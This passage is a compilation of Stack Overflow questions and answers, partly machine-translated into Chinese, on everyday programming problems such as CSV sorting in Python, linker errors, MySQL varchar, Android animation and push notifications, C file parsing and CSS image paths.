我可以编写新的 csv 文件或修改现有的文件。我已经`csv`在 python 和`sort`linunx 中查看过命令但我找不到任何解决方案。因此`new/Existing CSV File`，在 Failed 值之后，我的 temp5 排序值（即没有丢失任何行和 Failed 值是任何顺序）

努力：我也尝试过使用python代码，它建议我将字典和存储列作为键（你想要排序）和值组成完整的行，而不是对键进行排序并根据键检索数据。但我遇到了问题，它不包括失败的值。请找到我写进python的函数

```
csv_s_mt0 = csv.reader(open("data.csv","rb"))
    s_mt0_map = {}
    s_mt1_map = {}
    line_escape = 0
    for line in csv_s_mt0:
        if(line_escape > 3):
            print line
            print line[4]
            s_mt0_map[line[4]] = line
        else:
            line_escape = line_escape + 1
    s_mt0_map_key = s_mt0_map.keys()
    s_mt0_map_key.sort()
    for key in s_mt0_map_key:
        print s_mt0_map_key[key]

    print len(s_mt0_map_key)

$Header Information
$Tool info=3
.TITLE '*****************************************************'
Temp1,Temp2,Temp3,Temp4,Temp5,Temp6,Temp6,Temp7,Temp8,Temp9
0.,   failed,   failed,-2.700e-10, 9.803e-11,-2.725e-11, 2.725e-11,-1.645e-06, -40.0000,1
1.000e-12,   failed,   failed,-2.689e-10, 9.805e-11,-2.731e-11, 2.731e-11, 6.571e-08, -40.0000,1
2.000e-12,   failed,   failed,-2.679e-10, 9.806e-11,-2.731e-11, 2.731e-11, 6.835e-08, -40.0000,1
3.000e-12,   failed,   failed,-2.669e-10, 9.805e-11,-2.729e-11, 2.729e-11, 1.376e-07, -40.0000,1
4.000e-12,   failed,   failed,-2.660e-10, 9.803e-11,-2.731e-11, 2.731e-11, 3.583e-08, -40.0000,1
5.000e-12,   failed,   failed,-2.649e-10, 9.807e-11,-2.725e-11, 2.725e-11,-1.646e-06, -40.0000,1
6.000e-12,   failed,   failed,-2.640e-10, 9.803e-11,-2.731e-11, 2.731e-11, 3.579e-08, -40.0000,1
7.000e-12,   failed,   failed,-2.630e-10, 9.801e-11,-2.728e-11, 2.728e-11, 1.828e-07, -40.0000,1
8.000e-12,   failed,   failed,-2.620e-10, 9.805e-11,-2.729e-11, 2.729e-11, 1.353e-07, -40.0000,1
4.940e-10,   failed,   failed, 2.241e-10,   failed,   failed,   failed,   0.8100, -40.0000,1
4.950e-10,   failed,   failed, 2.251e-10,   failed,   failed,   failed,   0.8100, -40.0000,1
4.960e-10,   failed,   failed, 2.261e-10,   failed,   failed,   failed,   0.8100, -40.0000,1
4.970e-10,   failed,   failed, 2.271e-10,   failed,   failed,   failed,   0.8100, -40.0000,1
4.980e-10,   failed,   failed, 2.280e-10,   failed,   failed,   failed,   0.8100, -40.0000,1
4.990e-10,   failed,   failed, 2.291e-10,   failed,   failed,   failed,   0.8100, -40.0000,1
5.000e-10,   failed,   failed, 2.301e-10,   failed,   failed,   failed,   0.8100, -40.0000,1 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:34:21.377

该`key`函数用于排序，它返回`float('inf')`所有的`failed`，所以它们都放在列表的底部。同样，`float('-inf')`如果您希望它们都在顶部，则可以使用。

```
>>> import csv
>>> import sys # to print to sys.stdout for this example
>>> from itertools import islice
>>> def key(n):
        return float(n) if n != 'failed' else float('inf')

>>> with open('data.csv') as f:
        info = list(islice(f, 0, 3)) # first 3 lines
        r = csv.DictReader(f)
        w = csv.DictWriter(sys.stdout, r.fieldnames)
        rows = sorted(r, key=lambda row: key(row['Temp5']))    
        sys.stdout.writelines(info)
        w.writeheader()
        w.writerows(rows)

$HeaderInformation
$Toolinfo=3
.TITLE'*****************************************************'
Temp1,Temp2,Temp3,Temp4,Temp5,Temp6,Temp6,Temp7,Temp8,Temp9    
7.000e-12,failed,failed,-2.630e-10,9.801e-11,2.728e-11,2.728e-11,1.828e-07,-40.0000,1    
0.,failed,failed,-2.700e-10,9.803e-11,2.725e-11,2.725e-11,-1.645e-06,-40.0000,1    
4.000e-12,failed,failed,-2.660e-10,9.803e-11,2.731e-11,2.731e-11,3.583e-08,-40.0000,1    
6.000e-12,failed,failed,-2.640e-10,9.803e-11,2.731e-11,2.731e-11,3.579e-08,-40.0000,1    
1.000e-12,failed,failed,-2.689e-10,9.805e-11,2.731e-11,2.731e-11,6.571e-08,-40.0000,1    
3.000e-12,failed,failed,-2.669e-10,9.805e-11,2.729e-11,2.729e-11,1.376e-07,-40.0000,1    
8.000e-12,failed,failed,-2.620e-10,9.805e-11,2.729e-11,2.729e-11,1.353e-07,-40.0000,1    
2.000e-12,failed,failed,-2.679e-10,9.806e-11,2.731e-11,2.731e-11,6.835e-08,-40.0000,1    
5.000e-12,failed,failed,-2.649e-10,9.807e-11,2.725e-11,2.725e-11,-1.646e-06,-40.0000,1    
4.940e-10,failed,failed,2.241e-10,failed,failed,failed,0.8100,-40.0000,1    
4.950e-10,failed,failed,2.251e-10,failed,failed,failed,0.8100,-40.0000,1    
4.960e-10,failed,failed,2.261e-10,failed,failed,failed,0.8100,-40.0000,1    
4.970e-10,failed,failed,2.271e-10,failed,failed,failed,0.8100,-40.0000,1    
4.980e-10,failed,failed,2.280e-10,failed,failed,failed,0.8100,-40.0000,1    
4.990e-10,failed,failed,2.291e-10,failed,failed,failed,0.8100,-40.0000,1    
5.000e-10,failed,failed,2.301e-10,failed,failed,failed,0.8100,-40.0000,1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:42:42.677

Try this:

```
>>> c = list(csv.reader(s)) # here s is the file with the headers skipped
>>> final = []
>>> for row in c:
...    row = map(lambda x: x.strip(), row)
...    Temp5 = row[4]
...    if Temp5 != 'failed':
...        final.append(row)
>>> myprint.tabular(final) # just a pretty-printing function...
+ --------- + ------ + ------ + ---------- + --------- + ---------- + --------- + ---------- + -------- + ----- +
|   Temp1   | Temp2  | Temp3  |   Temp4    |   Temp5   |   Temp6    |   Temp6   |   Temp7    |  Temp8   | Temp9 |
+ --------- + ------ + ------ + ---------- + --------- + ---------- + --------- + ---------- + -------- + ----- +
|     0\.    | failed | failed | -2.700e-10 | 9.803e-11 | -2.725e-11 | 2.725e-11 | -1.645e-06 | -40.0000 |   1   |
| 1.000e-12 | failed | failed | -2.689e-10 | 9.805e-11 | -2.731e-11 | 2.731e-11 | 6.571e-08  | -40.0000 |   1   |
| 2.000e-12 | failed | failed | -2.679e-10 | 9.806e-11 | -2.731e-11 | 2.731e-11 | 6.835e-08  | -40.0000 |   1   |
| 3.000e-12 | failed | failed | -2.669e-10 | 9.805e-11 | -2.729e-11 | 2.729e-11 | 1.376e-07  | -40.0000 |   1   |
| 4.000e-12 | failed | failed | -2.660e-10 | 9.803e-11 | -2.731e-11 | 2.731e-11 | 3.583e-08  | -40.0000 |   1   |
| 5.000e-12 | failed | failed | -2.649e-10 | 9.807e-11 | -2.725e-11 | 2.725e-11 | -1.646e-06 | -40.0000 |   1   |
| 6.000e-12 | failed | failed | -2.640e-10 | 9.803e-11 | -2.731e-11 | 2.731e-11 | 3.579e-08  | -40.0000 |   1   |
| 7.000e-12 | failed | failed | -2.630e-10 | 9.801e-11 | -2.728e-11 | 2.728e-11 | 1.828e-07  | -40.0000 |   1   |
| 8.000e-12 | failed | failed | -2.620e-10 | 9.805e-11 | -2.729e-11 | 2.729e-11 | 1.353e-07  | -40.0000 |   1   |
+ --------- + ------ + ------ + ---------- + --------- + ---------- + --------- + ---------- + -------- + ----- + 
```

# visual-c++ - 错误 LNK1112：模块机器类型“X86”与目标机器类型“x64”冲突无法解决

> ID：16184751
> 
> 赞同：0
> 
> 时间：2013-04-24T06:22:18.603
> 
> 标签：visual-c++, dll, shared-libraries, matlab-deployment

我正在尝试集成从 MATLAB deploytool 生成的 C++ 共享库。我已经包含了所有必要的库和参考资料。我得到错误

错误 LNK1112：模块机器类型“X86”与目标机器类型“x64”冲突

当我尝试构建时。我将目标机器类型更改为机器 x64。我正在使用 MATLAB 64 位。我还将配置管理器中的设置更改为 x64，但错误仍然存​​在。

还有其他解决方案吗？是的，当我尝试将链接器中的目标机器更改为 x86 时，我得到了完全相反的错误

错误 LNK1112：模块机器类型“x64”与目标机器类型“X86”冲突

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-15T06:04:13.933

似乎，包含使用另一个库的库，这些库在 X86 中编译

# jquery - apache tile 每次都会刷新所有属性吗？

> ID：16184757
> 
> 赞同：2
> 
> 时间：2013-04-24T06:22:44.230
> 
> 标签：jquery, ajax, spring, apache-tiles

在我的 spring 应用程序中使用 Apache tile 之前，我想确认 apache tile 是否重新加载了所有布局属性（例如页眉、菜单、正文、页脚）一个新页面正在加载。

您能否确认它适用于每个新页面加载？此外，使用 ajax div load 与 apache tile 哪个更好？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T11:25:17.793

servlet 容器会注意到您的 JSP 文件中的更改并重新编译它们（当然，如果没有另外配置）；例如当你改变

```
<title><tiles:insertAttribute name="foo" /></title> 
```

至

```
<title><tiles:insertAttribute name="bar" /></title> 
```

`tiles.xml`默认情况下仅在启动时加载切片定义（即文件）。根据[文档](https://tiles.apache.org/tutorial/configuration.html)，您可以添加一个过滤器，该过滤器应该在需要时重新加载图块定义。

```
<filter>
    <filter-name>Tiles Filter</filter-name>
    <filter-class>org.apache.tiles.web.startup.TilesFilter</filter-class>
    <init-param>
        <param-name>
          org.apache.tiles.impl.BasicTilesContainer.DEFINITIONS_CONFIG
        </param-name>
        <param-value>
          /WEB-INF/tiles-defs.xml,/org/apache/tiles/classpath-defs.xml
        </param-value>
    </init-param>
</filter>

<filter-mapping>
    <filter-name>Tiles Filter</filter-name>
    <url-pattern>/*</url-pattern>
    <dispatcher>REQUEST</dispatcher>
</filter-mapping> 
```

不幸的是，它似乎不适用于我的情况。

[另一个消息来源](http://blog.nigelsim.org/2011/09/21/reloading-tiles2-config-in-spring-3-x/)建议改用这个：

```
<context-param>
  <param-name>org.apache.tiles.definition.dao.LocaleUrlDefinitionDAO.CHECK_REFRESH</param-name>
  <param-value>true</param-value>
</context-param> 
```

...但这对我也不起作用。

* * *

回复：*“ajax div load vs apache tiles”*：我不完全确定第一个是什么意思，假设这将在运行时通过 AJAX 获取 HTML 片段，我相信 Tiles 会表现得更好，因为页面会生成在服务器端，在 AJAX 解决方案中，用户的浏览器必须一点一点地组装它。这一切都取决于您的用例，真的（页面的动态程度如何？在用户会话期间它是否会改变？）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-03-23T07:20:59.153

```
<bean id="tilesConfigurer"
    class="org.springframework.web.servlet.view.tiles2.TilesConfigurer">
    <property name="definitions">
        <list>
            <value>WEB-INF/tiles.xml</value>
        </list>
    </property>
    <property name="checkRefresh" value="true" />
</bean> 
```

配置 Tiles 时使用**checkrefresh**属性。

这将首先加载所有片段，然后从内存缓存/磁盘缓存中加载它们。

您可以使用检查元素检查这一点

# mysql - Is there any difference between varchar(10) and varchar(1000) when we store string whose length is less than 10?

> ID：16184759
> 
> 赞同：7
> 
> 时间：2013-04-24T06:22:49.710
> 
> 标签：mysql, database, string, varchar

I understand the difference between `char` and `varchar` but I'm not sure of exact meaning of **varchar maximum length**.

When we store `string` whose length is less than 10, is there any difference between `varchar(10)` and `varchar(100)`?

I think both cases use same space and have same performance. If so, why do we need varchar max limit?

Is it enough to use just "`varchar`" instead of "`varchar(xxx)`"?

(added) I'm using MySQL 5.0.67

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-24T06:27:17.137

这完全取决于所使用的 DBMS 引擎。SQL 本身并没有规定如何物理存储事物，只规定如何在逻辑上查看它们。

例如，您的 DBMS 可能会在行中为最大大小分配空间，加上一些额外的字节来存储长度。在这种情况下，和之间会有很大的不同`varchar(10)`，`varchar(1000)`因为每行会浪费相当多的空间。

或者，它可以为`varchar`数据使用缓冲池，并在行中仅存储长度和缓冲池“起始地址”。在这种情况下，每一行都会为一`varchar`列存储相同大小的信息，而不管它的大小，但是会有一个额外的步骤来提取该列中的实际数据（按照指向缓冲池的链接）。

您使用 a 的原因`varchar`正是它被命名为的原因`varchar`。它允许您存储可变大小的数据元素。通常，`char(10)`无论如何都会给您十个字符，如果您插入较短的内容，则用空格填充它。您可以在提取时修剪尾随空格，但如果您要存储的数据实际上是`"hello "`，*并且*您希望保留尾随空格，则效果不佳。

一个不错的 DBMS 引擎可能会决定根据列的最大大小进行权衡`varchar`。对于简短的，它可以将其内联存储在行中并消耗额外的字节大小。

较长`varchar`的列可以“外包”到一个单独的缓冲池，以确保行读取保持高效（至少在您*需要*大`varchar`列之前）。

您需要做的是针对您的特定 DBMS 重新提出问题，以获得更有针对性的答案。

或者，老实说，将您的数据库设计为仅存储最大大小。如果你知道它是 10，那就太`varchar(1000)`浪费了。如果将来您需要扩大列，*那*就是时候做，而不是现在（参见[YAGNI](http://en.wikipedia.org/wiki/You_aren%27t_gonna_need_it)）。

* * *

对于 MySQL，您需要查看[`Chapter 14 Storage Engines`](http://dev.mysql.com/doc/refman/5.7/en/storage-engines.html)在线文档。

它涵盖了 MySQL 使用的各种存储引擎（例如 InnoDB 和 MyISAM），并且如果深入了解，您可以看到信息是如何物理存储的。

例如，在 MyISAM 中，表（`varchar`包含）中存在可变长度数据通常意味着[动态表](http://dev.mysql.com/doc/refman/5.7/en/dynamic-format.html)。这遵循了一个大致类似于我上面提到的缓冲池概念的方案，其优点是为可变大小的列浪费的空间更少，而缺点是行可能会变得碎片化。

另一种存储格式（不考虑压缩格式，因为它只真正用于只读表）是[静态](http://dev.mysql.com/doc/refman/5.7/en/static-format.html)格式，其中数据存储在单个物理行中。

关于 InnoDB 物理结构的信息可以在[这里](http://dev.mysql.com/doc/refman/5.7/en/innodb-table-and-index.html)找到。根据您使用的是 Antelope 还是 Barracuda 文件格式，您最终会遇到“所有信息都是物理行”或“缓冲池”的情况，类似于 MyISAM 对动态和静态的区分。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:28:35.327

在 SQL Server 中，该限制不会影响数据在磁盘上的存储方式。但是，它确实提供了一个免费的约束。如果您作为数据库设计者只希望存储最多 10 个字符，那么您已经阻止了某人存储小说。

> 仅使用“varchar”就足够了吗

同样，对于[SQL Server](http://msdn.microsoft.com/en-gb/library/ms176089.aspx)，几乎可以肯定不是您想要的。在大多数情况下，如果您不指定限制，您会得到一个`varchar(1)`（肯定是有史以来最无意义的数据类型）。有时，它是一个`varchar(30)`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T06:28:23.603

在 Oracle 中，Varchar 的大小会根据其用途而延伸，直到您设置限制为止。这意味着实际上，包含 2 个字符的 varchar(10) 和 varchar(100) 使用相同的空间（对于始终使用完整分配空间的 char 来说不同）。

# python - Python: renaming method names on-the-fly

> ID：16184761
> 
> 赞同：7
> 
> 时间：2013-04-24T06:22:50.913
> 
> 标签：python, dynamic, decorator

I have many files using classes with the following syntax:

```
o = module.CreateObject()
a = o.get_Field 
```

and now the implementation has changed from 'get_XXX' and 'set_XXX' to just 'XXX':

```
o = module.CreateObject()
a = o.Field 
```

This implementation is an external package, which I don't want to change. Is it possible to write a wrapper which will on-the-fly intercept all calls to 'get_XXX' and replace then with calls to the new name 'XXX'?

```
o = MyRenamer(module.CreateObject())
a = o.get_Field   # works as before, o.Field is called
a = o.DoIt()      # works as before, o.DoIt is called 
```

It needs to intercept all calls, not just to a finite-set of fields, decide based on the method name if to modify it and cause a method with a modified name to be called.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-24T06:37:35.237

如果您想继续使用`get_Field`和`set_Field`在已切换到使用属性的对象上（您只需访问或分配给`Field`），则可以使用包装器对象：

```
class NoPropertyAdaptor(object):
    def __init__(self, obj):
        self.obj = obj

    def __getattr__(self, name):
        if name.startswith("get_"):
            return lambda: getattr(self.obj, name[4:])
        elif name.startswith("set_"):
            return lambda value: setattr(self.obj, name[4:], value)
        else:
            return getattr(self.obj, name) 
```

如果您使用额外的语法，例如对对象进行索引或迭代，或者您需要使用`isinstance`.

一个更复杂的解决方案是创建一个子类来重写名称并强制对象使用它。这并不完全是一个包装，因为外部代码仍将直接处理对象（因此魔术方法和`isinstance`）将按预期工作。这种方法适用于大多数对象，但对于具有奇特元类魔法的类型和某些内置类型可能会失败：

```
def no_property_adaptor(obj):
    class wrapper(obj.__class__):
        def __getattr__(self, name):
            if name.startswith("get_"):
                return lambda: getattr(self, name[4:])
            elif name.startswith("set_"):
                return lambda value: setattr(self, name[4:], value)
            else:
                return super(wrapper, self).__getattr__(name)

    obj.__class__ = wrapper
    return obj 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:34:52.537

您可以[“猴子补丁”](http://en.wikipedia.org/wiki/Monkey_patch)任何 python 类；直接导入类并添加一个属性：

```
import original_module

@property
def get_Field(self):
    return self.Field

original_module.OriginalClass.get_Field = get_Field 
```

您需要枚举您希望以这种方式访问​​的字段：

```
def addField(fieldname, class):
    @property
    def get_Field(self):
        return getattr(self, fieldname)

    setattr(original_module.OriginalClass, 'get_{}'.format(fieldname), get_Field)

for fieldname in ('Foo', 'Bar', 'Baz'):
    addField(fieldname, original_module.OriginalClass) 
```

# c# - .Net remoting: Know in a service if the call have been made locally or remotely?

> ID：16184764
> 
> 赞同：1
> 
> 时间：2013-04-24T06:23:05.163
> 
> 标签：c#, ipc, remoting, .net-remoting, tcpchannel

I currently have a .Net remoting service that can be accessed by different ways:

*   Locally through an IPC channel
*   Remotely through a TCP channel
*   Locally through a TCP channel

I need to known, in one of my service method, if the call has been made locally or remotely(depending on a licence, I've to send smaller data remotely).

I can't find a way to find this.

I've already a custom `IServerChannelSink`, I thought that I can detect which type of channel is used of this call, and if it's a TCP one, check it's IP, but I can't find how.

Do you have any idea about how to check if we have a local call or not?

Thank you for the help

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T15:55:27.157

此[问题](https://stackoverflow.com/a/527756/2072213)显示如何使用其 IP 地址识别客户端。由于您已经有了一个自定义服务器通道接收器，它应该相当简单。

# android - 如何停止缩放动画中的闪烁？

> ID：16184767
> 
> 赞同：2
> 
> 时间：2013-04-24T06:23:11.097
> 
> 标签：android, xml, android-animation, flicker

我有一个`PopupWindow`用来`PopupWindow.setAnimationStyle();`在两个弹出窗口之间切换的地方。扫荡和动画作品。但是当我将 x 值从 0 缩放到 1 或 1 到 0 时，它会闪烁。

例如，这将闪烁：

```
<?xml version="1.0" encoding="utf-8"?>
<set
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:interpolator="@android:anim/accelerate_decelerate_interpolator"
    android:duration="300" >
    <scale
        android:pivotX="50%"
        android:fromXScale="1" android:toXScale="0"
        android:fromYScale="1" android:toYScale="1" />
</set> 
```

但这不会：

```
<?xml version="1.0" encoding="utf-8"?>
<set
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:interpolator="@android:anim/accelerate_decelerate_interpolator"
    android:duration="300" >
    <scale
        android:pivotX="50%"
        android:fromXScale="0.9" android:toXScale="0.1"
        android:fromYScale="1" android:toYScale="1" />
</set> 
```

为什么会闪烁，如何使它不闪烁？

这可能是我的设备，但我必须让它在这个设备上不闪烁。我有三星 Galaxy Tab 2 10.1

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-06-13T07:09:47.517

尝试添加具有最小值的延迟属性，

```
android:startOffset="1" 
```

这意味着动画会更快，可以减少闪烁。喜欢，

```
 <scale
        android:pivotX="50%"
        android:fromXScale="0.9" android:toXScale="0.1"
        android:fromYScale="1" android:toYScale="1" 
        android:startOffset="1"/> 
```

还要检查[这篇文章](https://stackoverflow.com/questions/12748437/android-scale-animation-flickering)说，启用硬件加速，它对我不起作用，但我能够通过调整延迟和持续时间值来解决这个问题。您的 pivotY 属性的值是多少？

希望这对您有所帮助，如果您已经解决了问题，请分享解决方案。

# android - Android中的推送通知错误

> ID：16184770
> 
> 赞同：0
> 
> 时间：2013-04-24T06:23:16.523
> 
> 标签：android, push-notification

在这里，我遇到了另一个问题`push notification`，它可以完美地工作，`emulator`但不能正常工作`device`。

代码：对于`GCMIntentService`

```
public class GCMIntentService extends GCMBaseIntentService{
public GCMIntentService(){
super(Constants.SenderId);
}
@Override
protected void onError(Context context, String regId) {
// TODO Auto-generated method stub
System.out.println("insideerroe");
Log.e("", "error registration id : "+regId);
}
@Override
protected void onMessage(Context context, Intent intent) {
// TODO Auto-generated method stub
}
@Override
protected void onRegistered(Context context, String regId) {
// TODO Auto-generated method stub
// Log.e(“”, “registration id : “+regId);
System.out.println("inside on registration");

handleRegistration(getApplicationContext(), regId);

}
@Override
protected void onUnregistered(Context context, String regId) {
// TODO Auto-generated method stub
}
private void handleRegistration(Context context, String regId) {
// TODO Auto-generated method stub
Log.e("", "registration id : "+regId);
}

} 
```

和下面的代码：

```
public class Androidpushnotification extends Activity {

@Override
public void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.activity_main);
GCMRegistrar.checkDevice(this);
GCMRegistrar.checkManifest(this);
String regId = GCMRegistrar.getRegistrationId(this);
if (regId.equals("")) {
GCMRegistrar.register(this, Constants.SenderId);
}

else {
Log.v("", "Already registered: "+regId);

}
}
@Override
protected void onDestroy() {
GCMRegistrar.onDestroy(this);
super.onDestroy();
}
} 
```

清单文件：

```
 <!-- GCM connects to Internet Services. -->
    <uses-permission android:name="android.permission.INTERNET" />

    <!-- GCM requires a Google account. -->
    <uses-permission android:name="android.permission.GET_ACCOUNTS" />

    <!-- Keeps the processor from sleeping when a message is received. -->
    <uses-permission android:name="android.permission.WAKE_LOCK" />

    <!-- Creates a custom permission so only this app can receive its messages. -->
    <permission
        android:name="com.example.androidpushnotification.permission.C2D_MESSAGE"
        android:protectionLevel="signature" />

    <uses-permission android:name="com.example.androidpushnotification.permission.C2D_MESSAGE" />

    <!-- This app has permission to register and receive data message. -->
    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />

    <!-- Network State Permissions to detect Internet status -->
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission
  android:name="android.permission.READ_PHONE_STATE" >
</uses-permission>
    <!-- Permission to vibrate -->
    <uses-permission android:name="android.permission.VIBRATE" />
    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >
        <activity
            android:name=".Androidpushnotification"
            android:label="@string/app_name" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <receiver
            android:name="com.google.android.gcm.GCMBroadcastReceiver"
            android:permission="com.google.android.c2dm.permission.SEND" >
            <intent-filter>

                <!-- Receives the actual messages. -->
                <action android:name="com.google.android.c2dm.intent.RECEIVE" />
                <!-- Receives the registration id. -->
                <action android:name="com.google.android.c2dm.intent.REGISTRATION" />

                <category android:name="com.example.androidpushnotification" />
            </intent-filter>
        </receiver>

        <service android:name=".GCMIntentService" />
    </application> 
```

有人可以帮我解决这个问题吗，谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-14T11:32:20.760

我认为这个问题是安卓操作系统版本的。我遇到了同样的问题，发现它只适用于操作系统版本> = 4.1。

因此，您可能正在使用模拟器版本 >= 4.1 对其进行测试。并且您的设备可能低于 os 版本 4.1。

请使用 4.1 或更高版本的设备检查/测试它。你会发现它有效。

简而言之，您的代码是正确的并且它的工作代码是正确的。

仅供参考：我认为这个问题发生在 2013 年 4 月 15 日之后。而且我仍然没有任何解决方法。

如果您/任何人发现相同方向的东西，请与我们分享。

谢谢，-Umang Kathiyara

# c - allocate memory and read input from file to arrays of structures

> ID：16184771
> 
> 赞同：-2
> 
> 时间：2013-04-24T06:23:18.303
> 
> 标签：c, file, memory-management, structure

I have question about reading data from file to structures when I tried to run this code i get unhandled exception Access violation reading location 0xcccccce0, The error occur inside the getData function, Why am I getting this error, how Should I fix the code ?

this is my input file

```
4
A,10
B,12
C,60
D,120
tutorY 
```

my intention in the getData function was to first read the first line to get then number 4, then use that number to allocate for student structure and then read the next four lines of the file in to student structure fields and then read the last line into tutorname feild in the TUTOR structure.

thank in advance

```
 #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include "queue.h"
    #include "stack.h"

    #define RECORDS_SIZE 100
    #define NAME_SIZE    20

    typedef struct Student
    {
        char nameStudent[NAME_SIZE];
        int  TimeIn;
        int  TimeUpdate;
    }STUDENT;

    typedef struct TUTOR
    {
        char nameTutor[NAME_SIZE];
        int TutorTIme;
        STUDENT *ptr;
    }TUTOR;

    QUEUE *queue1;
    STACK *stack1;

    void getData(STUDENT *studentArr[RECORDS_SIZE], TUTOR tutorArr[1]);

    int main (void)
    {

        STUDENT *studentArr[RECORDS_SIZE];
        TUTOR tutorArr[1];
        FILE *fp = NULL;

        getData(studentArr, tutorArr);

        return 0;
    }

    void getData(STUDENT *studentArr[RECORDS_SIZE], TUTOR tutorArr[1])
    {
        FILE *fp;
        char fileName[NAME_SIZE];
        char buffer[RECORDS_SIZE];
        int first = 0;
        int count = 1;

        printf("Enter file name: ");
        gets(fileName);
        fp = fopen(fileName, "r");
        if (fp == NULL)
        {
           printf("Error! The file does not exist!\n");
        }

        fscanf(fp,"%d",&first);
        *studentArr = (STUDENT*) malloc(first*sizeof(STUDENT));
        while( fgets(buffer, first +1, fp) != NULL)
        {          
           if (count <= first)
           {
              sscanf(buffer, "%[,]%d", studentArr[count]->nameStudent, studentArr[count]->TimeIn);
              printf("%s,%d", studentArr[count]->nameStudent, studentArr[count]->TimeIn);  
           }
           else
              sscanf(buffer, "%s", tutorArr[count].nameTutor);
               count++;
        }

        return;
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:45:38.960

我发现了几个问题。

1.  第一次读取 fscanf 将读取第一个数字，然后将剩余的行 ("\n") 留给第一次调用 fgets 来获取

2.  更重要的是，studentArr 是一个指针数组，大概每个学生都有一个元素，但是 malloc 只分配了 sudentArr 中的第一个指针，其他的都包含垃圾，这导致了访问冲突。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T07:13:38.260

还有一些问题：

1.  `count`应该初始化为 0 而不是 1 因为你的数组是零索引的。
2.  你没有`count`在你的循环中增加
3.  为循环内的每个学生分配内存`studentArr[count] = new Student();`
4.  更喜欢`strtok`sscanf` 将缓冲区拆分为字段。处理字符串后面的逗号要容易得多。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T07:13:49.637

像这样修复

```
void getData(STUDENT **studentArr, TUTOR tutorArr[1]);//change

int main (void)
{

    STUDENT *studentArr;//change
    TUTOR tutorArr[1];
    FILE *fp = NULL;//not use

    getData(&studentArr, tutorArr);//change

    return 0;
}

void getData(STUDENT **studentArr, TUTOR tutorArr[1])
{
    FILE *fp;
    char fileName[NAME_SIZE];
    char buffer[RECORDS_SIZE];
    int first = 0;
    int count = 1;

    printf("Enter file name: ");
    gets(fileName);//has risk
    fp = fopen(fileName, "r");
    if (fp == NULL)
    {
       printf("Error! The file does not exist!\n");
       return;//add, can't continue
    }

    fscanf(fp,"%d\n",&first);//add, consumption '\n'
    *studentArr = (STUDENT*) malloc(first*sizeof(STUDENT));
    while( fgets(buffer, RECORDS_SIZE, fp) != NULL)//change buffer size
    {          
       if (count <=first)//
       {
          sscanf(buffer, "%[^,],%d", (*studentArr)[count-1].nameStudent, &(*studentArr)[count-1].TimeIn);//add, `,` and -1 to count is 1 origin, `&` need for "%d" 
          printf("%s,%d\n", (*studentArr)[count-1].nameStudent, (*studentArr)[count-1].TimeIn);  
          ++count;//need count up
       }
       else
          sscanf(buffer, "%s", tutorArr[0].nameTutor);
    }

    return;//need allocate record size return to main
} 
```

# css - Images Not working

> ID：16184773
> 
> 赞同：1
> 
> 时间：2013-04-24T06:23:20.247
> 
> 标签：css, asp.net-mvc, razor, background-image

I have a MVC Project

Click this url :

> [http://epstechno.com/schoolbriefcase/](http://epstechno.com/schoolbriefcase/)

Then Click this url :

> [http://epstechno.com/schoolbriefcase/Account/Login](http://epstechno.com/schoolbriefcase/Account/Login)

**Must look above url difference .But it's gone same page**

But when i put this `http://epstechno.com/schoolbriefcase` url, *Why images are not shown ?*

And the same problem in click this *(pass query string )*:

> [http://epstechno.com/schoolbriefcase/Discussion/ViewDiscussion/24](http://epstechno.com/schoolbriefcase/Discussion/ViewDiscussion/24)

and then click this

> [http://epstechno.com/schoolbriefcase/Discussion/ViewDiscussion?id=24](http://epstechno.com/schoolbriefcase/Discussion/ViewDiscussion?id=24)

when i put `http://epstechno.com/schoolbriefcase/Discussion/ViewDiscussion/24` , Why Images are not shown ?

My Image path is

```
url('**../Images/sidecurve.png**') 
```

But i have already tried `../../` and `~/` . But bad luck it's not working

Any one help me .

**Update** :

But When i put full url for

```
background: url('**http://epstechno.com/schoolbriefcase/Images/sidecurve.png**') repeat-y; 
```

This time working .

What problem ?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T08:05:11.757

现在我找到了。我使用了@Url.Content 它的工作

```
<img src="@Url.Content("~/Images/logo1.jpg")" /> 
```

# ios - 在 ipod 上叠加混合两个图像会产生抖动的结果图像

> ID：16184776
> 
> 赞同：1
> 
> 时间：2013-04-24T06:23:34.337
> 
> 标签：ios, image, overlay, ipod, blending

我正在根据用户更改图像的颜色（用户从颜色列表中选择颜色），因为我使用两个图像的叠加混合模式来更改颜色。我有一个字符的第一张图像（img1）并且它的颜色要改变，我正在从字符图像创建一个图像（resultUIImage），如下所示，并更改它的像素值以获得用户选择的颜色。然后我叠加 img1 和 resultUIImage 以获得我的预期结果（img2），但 img2 很紧张；它在不同颜色的两个细节之间的边界是一条虚线。但是，如果针对 ipad 测试同一项目，则不会出现这些断开的边界。这里可能的错误是什么，或者还有其他方法可以做到这一点吗？

